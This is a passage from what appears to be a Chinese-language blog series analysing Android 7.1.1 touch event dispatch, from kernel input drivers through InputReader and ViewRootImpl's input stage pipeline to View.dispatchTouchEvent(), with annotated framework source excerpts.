<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (inputEvent-&gt;getType()) &#123;</span><br><span class="line">          <span class="keyword">case</span> AINPUT_EVENT_TYPE_KEY:</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> AINPUT_EVENT_TYPE_MOTION: &#123;</span><br><span class="line">              <span class="keyword">if</span> (kDebugDispatchCycle) &#123;</span><br><span class="line">                  ALOGD(<span class="string">"channel '%s' ~ Received motion event."</span>, getInputChannelName());</span><br><span class="line">              &#125;</span><br><span class="line">              MotionEvent* motionEvent = <span class="keyword">static_cast</span>&lt;MotionEvent*&gt;(inputEvent);</span><br><span class="line">              <span class="keyword">if</span> ((motionEvent-&gt;getAction() &amp; AMOTION_EVENT_ACTION_MOVE) &amp;&amp; outConsumedBatch) &#123;</span><br><span class="line">                  *outConsumedBatch = <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              inputEventObj = android_view_MotionEvent_obtainAsCopy(env, motionEvent);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">    		...</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (inputEventObj) &#123;</span><br><span class="line">              <span class="keyword">if</span> (kDebugDispatchCycle) &#123;</span><br><span class="line">                  ALOGD(<span class="string">"channel '%s' ~ Dispatching input event."</span>, getInputChannelName());</span><br><span class="line">              &#125;</span><br><span class="line">              env-&gt;CallVoidMethod(receiverObj.<span class="built_in">get</span>(),</span><br><span class="line">                      gInputEventReceiverClassInfo.dispatchInputEvent, seq, inputEventObj);</span><br><span class="line">         ...</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>下面就对<code>inputEvent</code>（即为<code>MotionEvent</code>）的类型作了一个判断，对<code>inputEventObj</code>（用于调用<code>java</code>层方法）进行赋值。随后就通过<code>JNI</code> 的<code>CallVoidMethod()</code>方法来调用<code>java</code>层的<code>dispatchInputEvent()</code>方法。这里调用的是<code>java</code>层<code>InputEventReceiver</code>的<code>dispatchInputEvent()</code>方法：</p>
<p>从这里，我们从<code>Native</code>层跨越到了<code>java</code>层。</p>
<h2 id="开始分发"><a href="#开始分发" class="headerlink" title="开始分发"></a>开始分发</h2><h3 id="dispatchInputEvent"><a href="#dispatchInputEvent" class="headerlink" title="dispatchInputEvent"></a>dispatchInputEvent</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dispatchInputEvent</span><span class="params">(<span class="keyword">int</span> seq, InputEvent event)</span> </span>&#123;</span><br><span class="line">    mSeqMap.put(event.getSequenceNumber(), seq);</span><br><span class="line">    onInputEvent(event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>InputEventReceiver</code>是一个抽象类，具体实现类是<code>ViewRootImpl</code>的内部类<code>WindowInputEventReceiver</code>，它覆盖了<code>onInputEvent()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onInputEvent</span><span class="params">(InputEvent event)</span> </span>&#123;</span><br><span class="line">    enqueueInputEvent(event, <span class="keyword">this</span>, <span class="number">0</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了<code>ViewRootImpl</code>的<code>enqueueInputEvent()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enqueueInputEvent</span><span class="params">(InputEvent event, InputEventReceiver receiver, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">                       <span class="keyword">boolean</span> processImmediately)</span> </span>&#123;</span><br><span class="line">    adjustInputEventForCompatibility(event);</span><br><span class="line">    QueuedInputEvent q = obtainQueuedInputEvent(event, receiver, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Always enqueue the input event in order, regardless of its time stamp.</span></span><br><span class="line">    <span class="comment">// We do this because the application or the IME may inject key events</span></span><br><span class="line">    <span class="comment">// in response to touch events and we want to ensure that the injected keys</span></span><br><span class="line">    <span class="comment">// are processed in the order they were received and we cannot trust that</span></span><br><span class="line">    <span class="comment">// the time stamp of injected events are monotonic.</span></span><br><span class="line">    QueuedInputEvent last = mPendingInputEventTail;</span><br><span class="line">    <span class="keyword">if</span> (last == <span class="keyword">null</span>) &#123;</span><br><span class="line">        mPendingInputEventHead = q;</span><br><span class="line">        mPendingInputEventTail = q;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        last.mNext = q;</span><br><span class="line">        mPendingInputEventTail = q;</span><br><span class="line">    &#125;</span><br><span class="line">    mPendingInputEventCount += <span class="number">1</span>;</span><br><span class="line">    Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName,</span><br><span class="line">                       mPendingInputEventCount);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (processImmediately) &#123;</span><br><span class="line">        doProcessInputEvents();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        scheduleProcessInputEvents();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将接收到的事件加入了<code>mPendingInutEvent</code>链表的头部，注释里给出了这么做的原因：当发生事件插入的时候我们不能依赖事件的时间戳是准确的，因此必须让最新收到的事件先进行处理。</p>
<p>最终调用<code>doProcessInputEvents()</code>进行事件处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doProcessInputEvents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Deliver all pending input events in the queue.</span></span><br><span class="line">    <span class="keyword">while</span> (mPendingInputEventHead != <span class="keyword">null</span>) &#123;</span><br><span class="line">        QueuedInputEvent q = mPendingInputEventHead;</span><br><span class="line">        mPendingInputEventHead = q.mNext;</span><br><span class="line">        <span class="keyword">if</span> (mPendingInputEventHead == <span class="keyword">null</span>) &#123;</span><br><span class="line">            mPendingInputEventTail = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        q.mNext = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        mPendingInputEventCount -= <span class="number">1</span>;</span><br><span class="line">        Trace.traceCounter(Trace.TRACE_TAG_INPUT, mPendingInputEventQueueLengthCounterName,</span><br><span class="line">                mPendingInputEventCount);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> eventTime = q.mEvent.getEventTimeNano();</span><br><span class="line">        <span class="keyword">long</span> oldestEventTime = eventTime;</span><br><span class="line">        <span class="keyword">if</span> (q.mEvent <span class="keyword">instanceof</span> MotionEvent) &#123;</span><br><span class="line">            MotionEvent me = (MotionEvent)q.mEvent;</span><br><span class="line">            <span class="keyword">if</span> (me.getHistorySize() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                oldestEventTime = me.getHistoricalEventTimeNano(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        mChoreographer.mFrameInfo.updateInputEventTime(eventTime, oldestEventTime);</span><br><span class="line"></span><br><span class="line">        deliverInputEvent(q);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在从链表中取出事件之后，对事件的时间戳进行了更新。然后调用<code>deliverInputEvent()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">deliverInputEvent</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    Trace.asyncTraceBegin(Trace.TRACE_TAG_VIEW, <span class="string">"deliverInputEvent"</span>, q.mEvent.getSequenceNumber());</span><br><span class="line">    <span class="keyword">if</span> (mInputEventConsistencyVerifier != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputEventConsistencyVerifier.onInputEvent(q.mEvent, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InputStage stage;</span><br><span class="line">    <span class="keyword">if</span> (q.shouldSendToSynthesizer()) &#123;</span><br><span class="line">        stage = mSyntheticInputStage;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        stage = q.shouldSkipIme() ? mFirstPostImeInputStage : mFirstInputStage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stage != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stage.deliver(q);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        finishInputEvent(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码第一眼看上去比较难懂，<code>Stage</code>让我们联想到了CPU流水线处理过程中的<code>Stage</code>，这里就是进入了一个流水线过程来处理事件：</p>
<h3 id="流水线事件处理"><a href="#流水线事件处理" class="headerlink" title="流水线事件处理"></a>流水线事件处理</h3><p><img src="/images/event2_1.png" alt=""></p>
<p><img src="/images/event2_2.png" alt=""></p>
<p>首先看到我们可以根据事件类型的需要从<code>mSyntheticInputStage</code> <code>EarlyPostImeInputStage</code> <code>NativePreImeInputStage</code>三个入口进入流水线，而流水线的每一步都对事件进行了不同的处理，并可以通过<code>forward()</code>方法传递到下一个<code>Stage</code>进行处理。并且这里使用的流水线是一个异步流水线，可以允许多个事件同时在里面运行处理，这种架构使得事件处理流程效率非常高。</p>
<p>那么我们的触摸事件从<code>NativePreImeInputStage</code>进入流水线后会经历什么处理过程呢：</p>
<p>我们并不是<code>IME</code>的事件，所以直接从<code>EarlyPostImeInputStage</code>开始：</p>
<h4 id="EarlyPostImeInputStage"><a href="#EarlyPostImeInputStage" class="headerlink" title="EarlyPostImeInputStage"></a>EarlyPostImeInputStage</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">onProcess</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (q.mEvent <span class="keyword">instanceof</span> KeyEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> processKeyEvent(q);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> source = q.mEvent.getSource();</span><br><span class="line">        <span class="keyword">if</span> ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> processPointerEvent(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FORWARD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第7行判断成立，进入<code>processPointerEvent()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">processPointerEvent</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MotionEvent event = (MotionEvent)q.mEvent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Translate the pointer event for compatibility, if needed.</span></span><br><span class="line">    <span class="keyword">if</span> (mTranslator != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mTranslator.translateEventInScreenToAppWindow(event);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enter touch mode on down or scroll.</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> action = event.getAction();</span><br><span class="line">    <span class="keyword">if</span> (action == MotionEvent.ACTION_DOWN || action == MotionEvent.ACTION_SCROLL) &#123;</span><br><span class="line">        ensureTouchMode(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Offset the scroll position.</span></span><br><span class="line">    <span class="keyword">if</span> (mCurScrollY != <span class="number">0</span>) &#123;</span><br><span class="line">        event.offsetLocation(<span class="number">0</span>, mCurScrollY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remember the touch position for possible drag-initiation.</span></span><br><span class="line">    <span class="keyword">if</span> (event.isTouchEvent()) &#123;</span><br><span class="line">        mLastTouchPoint.x = event.getRawX();</span><br><span class="line">        mLastTouchPoint.y = event.getRawY();</span><br><span class="line">        mLastTouchSource = event.getSource();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FORWARD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对事件进行处理以后继续进入下一阶段。</p>
<h4 id="NativePostImeInputStage"><a href="#NativePostImeInputStage" class="headerlink" title="NativePostImeInputStage"></a>NativePostImeInputStage</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">onProcess</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (mInputQueue != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mInputQueue.sendInputEvent(q.mEvent, q, <span class="keyword">false</span>, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> DEFER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FORWARD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果有事件等待被处理，则推迟当前事件的处理（实现异步）。否则直接进入下一个阶段：</p>
<h4 id="ViewPostImeInputStage"><a href="#ViewPostImeInputStage" class="headerlink" title="ViewPostImeInputStage"></a>ViewPostImeInputStage</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">onProcess</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (q.mEvent <span class="keyword">instanceof</span> KeyEvent) &#123;</span><br><span class="line">        <span class="keyword">return</span> processKeyEvent(q);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> source = q.mEvent.getSource();</span><br><span class="line">        <span class="keyword">if</span> ((source &amp; InputDevice.SOURCE_CLASS_POINTER) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> processPointerEvent(q);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((source &amp; InputDevice.SOURCE_CLASS_TRACKBALL) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> processTrackballEvent(q);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> processGenericMotionEvent(q);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第7行判断成立，调用<code>processPointerEvent()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">processPointerEvent</span><span class="params">(QueuedInputEvent q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> MotionEvent event = (MotionEvent)q.mEvent;</span><br><span class="line"></span><br><span class="line">    mAttachInfo.mUnbufferedDispatchRequested = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">final</span> View eventTarget =</span><br><span class="line">            (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; mCapturingView != <span class="keyword">null</span>) ?</span><br><span class="line">                    mCapturingView : mView;</span><br><span class="line">    mAttachInfo.mHandlingPointerEvent = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">boolean</span> handled = eventTarget.dispatchPointerEvent(event);</span><br><span class="line">	...</span><br><span class="line">    <span class="keyword">return</span> handled ? FINISH_HANDLED : FORWARD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>判断目标是否是<code>mCapturingView</code>，一般情况下目标就是<code>mView</code>（也就是当前<code>Window</code>的根<code>View</code>也就是<code>DecorView</code>），然后调用了它的<code>dispatchPointerEvent()</code>方法（继承自<code>View</code>）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">dispatchPointerEvent</span><span class="params">(MotionEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.isTouchEvent()) &#123;</span><br><span class="line">        <span class="keyword">return</span> dispatchTouchEvent(event);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> dispatchGenericMotionEvent(event);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>到这里，我们终于看到了熟悉的<code>dispatchTouchEvent()</code>方法，同时这也是一般触摸事件分发机制分析的开始。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>现在，我们了解了从原始事件的产生地点到某个应用<code>UI</code>线程事件循环再到根<code>view</code>的<code>dispatchTouchEvent()</code>的整个流程。分析这个过程还是要再次感谢<a href="http://gityuan.com/" target="_blank" rel="noopener">Gityuan的博客</a>，这个过程找得到的资料只有他的文章，省了许多功夫。</p>
<p>下一篇文章开始就要讲解一般触摸事件分发分析的过程，也是参考资料比较多的部分。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>View</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>View</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 触摸事件分发机制（一）从内核到应用 一切的开始</title>
    <url>/2017/09/14/android_view_event_1/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p><strong>本文基于<code>Android 7.1.1 (API 25)</code>的源码分析编写</strong></p>
<p>安卓是基于触摸操作进行交互的系统，几乎所有的操作都由对屏幕的一次次触摸完成，如何正确处理触摸事件关乎整个应用的操作体验。因此安卓对于触摸事件的分发与处理机制也是我们学习安卓开发的重中之重。同时几乎每一个安卓技术博客中都会对触摸分发机制这一块进行详解，例如比较早期也是最为出名的<a href="http://blog.csdn.net/guolin_blog/article/details/9097463/" target="_blank" rel="noopener">郭霖</a>（《第一行代码》的作者）。现在网络上对于这一块的分析也已经比较详尽了，基本上一篇博客中遗漏的部分都可以在其他博客中找到答案。</p>
<p>但是无论别人的文章讲得多好，多么详细，我们都需要自己去打开源码仔细分析好好体会，一是这样一个比较复杂的过程不经历自己的思考很难完全理解，二是随着<code>api</code>版本的推进这部分源码也会发生很多变化，虽然大致思路相同，但是接触到新的内容总是一件好事。</p>
<p>这也就是我写这篇博文的原因：记录自己思考与分析的过程。</p>
<a id="more"></a>
<h2 id="触摸事件的来源"><a href="#触摸事件的来源" class="headerlink" title="触摸事件的来源"></a>触摸事件的来源</h2><p>这部分的内容与安卓本身无关，代码大部分也都是<code>C++</code>实现的，中间的大部分内容来自于我对相关资料的总结，不在代码层面进行详细解释，只是说明一个流程，同时也会对代码进行大部分的删减，只关注最核心的那部分。</p>
<h3 id="从硬件到内核"><a href="#从硬件到内核" class="headerlink" title="从硬件到内核"></a>从硬件到内核</h3><p>我们从头开始，从触摸事件最初最初的来源开始，我们知道内核是以处理中断的方式处理用户的输入的，触摸事件作为一种特殊的输入事件，自然也需要这种方式进行处理，只不过触摸事件的提供的信息要稍微复杂一些。</p>
<p>触摸事件来自于我们对硬件的操作，最初的来源当然是硬件引起的中断。而处理特定中断的代码则来自于对应硬件的驱动：</p>
<p><img src="/images/event1_1.png" alt=""></p>
<p><a href="http://newandroidbook.com/files/AndroidInput.pdf" target="_blank" rel="noopener">图片来源</a>（以下系列图片来源相同，不作标注）</p>
<p>当一个输入设备的驱动模块被首次载入内核的时候，会检测它应该管理的硬件设备，如果检测成功，驱动模块会调用<code>include/linux/input.h</code>中的<code>input_register_device(…)</code>函数设置一个<code>/dev/input/eventX</code>（<code>X</code>为整数）来代表这个输入设备。驱动模块同时也会通过<code>include/linux/interrupt.h</code>的<code>request_irq(…)</code>函数注册一个函数去处理这个硬件引发的中断，注册成功以后，当设备因用户交互而产生中断的时候就会交给对应的驱动模块进行处理。</p>
<p>驱动模块处理的细节各不相同，但最终都会将数据处理后存放进对应的<code>/dev/input/eventX</code>文件中。</p>
<p><img src="/images/event1_2.png" alt=""></p>
<h3 id="系统对触摸事件的处理"><a href="#系统对触摸事件的处理" class="headerlink" title="系统对触摸事件的处理"></a>系统对触摸事件的处理</h3><p>现在驱动程序为我们收集好了原始的输入信息并存放在了<code>eventX</code>文件中，下一步就是系统对于这个文件的处理并发送到应用层面。</p>
<p><img src="/images/event1_3.png" alt=""></p>
<p>可以看到系统服务充当了从内核到应用的桥梁。</p>
<p><img src="/images/event1_4.png" alt=""></p>
<p>系统服务由三个组件构成：<code>EventHub</code>、<code>InputReader</code>、<code>InputDispatcher</code>，关于它们的作用的详细分析在：</p>
<blockquote>
<p>  <a href="http://gityuan.com/2016/12/31/input-ipc/" target="_blank" rel="noopener">http://gityuan.com/2016/12/31/input-ipc/</a></p>
</blockquote>
<p>下面对这个过程作简单介绍。</p>
<h4 id="EventHub"><a href="#EventHub" class="headerlink" title="EventHub"></a>EventHub</h4><p>文件在<code>frameworks/native/services/inputflinger/EventHub.cpp</code></p>
<p>它的作用是监听、读取<code>/dev/input</code>目录下产生的新事件，并封装成<code>RawEvent</code>结构体供<code>InputReader</code>使用。</p>
<h4 id="InputReader"><a href="#InputReader" class="headerlink" title="InputReader"></a>InputReader</h4><p>文件在<code>frameworks/native/services/inputflinger/InputReader.cpp</code></p>
<p><code>InputReader</code>运行在一个单独的进程中，这个进程由<code>InputManagerService</code>的初始化而新建，具体内容请见：</p>
<blockquote>
<p>  <a href="http://gityuan.com/2016/12/10/input-manager/" target="_blank" rel="noopener">http://gityuan.com/2016/12/10/input-manager/</a></p>
</blockquote>
<p>它会在内部不断地循环调用<code>loopOnce()</code>方法来不断读取事件：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputReader::loopOnce</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">size_t</span> count = mEventHub-&gt;getEvents(timeoutMillis, mEventBuffer, EVENT_BUFFER_SIZE);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (count) &#123;</span><br><span class="line">        processEventsLocked(mEventBuffer, count);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第3行调用了<code>mEventHub</code>的<code>getEvent()</code>方法以获取事件。</p>
<p>第6行调用<code>processEventLocked()</code>方法来处理事件，经过一系列判断之后，会执行这行代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">device-&gt;process(rawEvents, count);</span><br></pre></td></tr></table></figure>
<p><code>process</code>函数会执行如下代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">InputMapper* mapper = mMappers[i];</span><br><span class="line">mapper-&gt;process(rawEvent);</span><br></pre></td></tr></table></figure>
<p>使用<code>mapper</code>去处理<code>rawEvent</code>，不同的输入事件类型会由不同的<code>mapper</code>去处理，以处理触摸事件的<code>TouchInputMapper</code>为例：</p>
<p>只看核心调用的话，会依次调用如下函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::process</span><span class="params">(<span class="keyword">const</span> RawEvent* rawEvent)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::sync</span><span class="params">(<span class="keyword">nsecs_t</span> when)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::processRawTouches</span><span class="params">(<span class="keyword">bool</span> timeout)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::cookAndDispatch</span><span class="params">(<span class="keyword">nsecs_t</span> when)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::dispatchTouches</span><span class="params">(<span class="keyword">nsecs_t</span> when, <span class="keyword">uint32_t</span> policyFlags)</span> </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TouchInputMapper::dispatchMotion</span><span class="params">(<span class="keyword">nsecs_t</span> when, <span class="keyword">uint32_t</span> policyFlags, <span class="keyword">uint32_t</span> source,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int32_t</span> action, <span class="keyword">int32_t</span> actionButton, <span class="keyword">int32_t</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int32_t</span> metaState, <span class="keyword">int32_t</span> buttonState, <span class="keyword">int32_t</span> edgeFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> PointerProperties* properties, <span class="keyword">const</span> PointerCoords* coords,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">uint32_t</span>* idToIndex, BitSet32 idBits, <span class="keyword">int32_t</span> changedId,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">float</span> xPrecision, <span class="keyword">float</span> yPrecision, <span class="keyword">nsecs_t</span> downTime)</span></span></span><br></pre></td></tr></table></figure>
<p>在最终的<code>dispatchMotion()</code>函数中执行以下代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NotifyMotionArgs <span class="title">args</span><span class="params">(when, getDeviceId(), source, policyFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">        action, actionButton, flags, metaState, buttonState, edgeFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">        mViewport.displayId, pointerCount, pointerProperties, pointerCoords,</span></span></span><br><span class="line"><span class="function"><span class="params">        xPrecision, yPrecision, downTime)</span></span>;</span><br><span class="line">getListener()-&gt;notifyMotion(&amp;args);</span><br></pre></td></tr></table></figure>
<p>可以看到事件已经被处理成了一个<code>args</code>，然后调用<code>getListener()</code>：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">InputListenerInterface* InputReader::ContextImpl::getListener() &#123;</span><br><span class="line">    <span class="keyword">return</span> mReader-&gt;mQueuedListener.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获取的是<code>mQueuedListener</code>，查看<code>notifyMotion()</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueuedInputListener::notifyMotion</span><span class="params">(<span class="keyword">const</span> NotifyMotionArgs* args)</span> </span>&#123;</span><br><span class="line">    mArgsQueue.push(<span class="keyword">new</span> NotifyMotionArgs(*args));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>NotifyMotionArgs()</code>只是对事件进行了一次再封装。可以看到这个<code>args</code>最终进入了<code>QueuedInputListener</code>的<code>mArgsQueue</code>中。</p>
<p>我们再回到<code>InputReader</code>的<code>loopOnce()</code>函数中，函数在执行完上述调用到达最后一行时：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mQueuedListener-&gt;flush();</span><br></pre></td></tr></table></figure>
<p>调用<code>flush()</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QueuedInputListener::flush</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = mArgsQueue.size();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        NotifyArgs* args = mArgsQueue[i];</span><br><span class="line">        args-&gt;notify(mInnerListener);</span><br><span class="line">        <span class="keyword">delete</span> args;</span><br><span class="line">    &#125;</span><br><span class="line">    mArgsQueue.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用了各<code>args</code>的<code>notify()</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NotifyMotionArgs::notify</span><span class="params">(<span class="keyword">const</span> sp&lt;InputListenerInterface&gt;&amp; listener)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    listener-&gt;notifyMotion(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里的<code>listener</code>传入的是<code>mInnerListener</code>，它是什么呢？</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">QueuedInputListener::QueuedInputListener(<span class="keyword">const</span> sp&lt;InputListenerInterface&gt;&amp; innerListener) :</span><br><span class="line">        mInnerListener(innerListener) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在构造函数中初始化。</p>
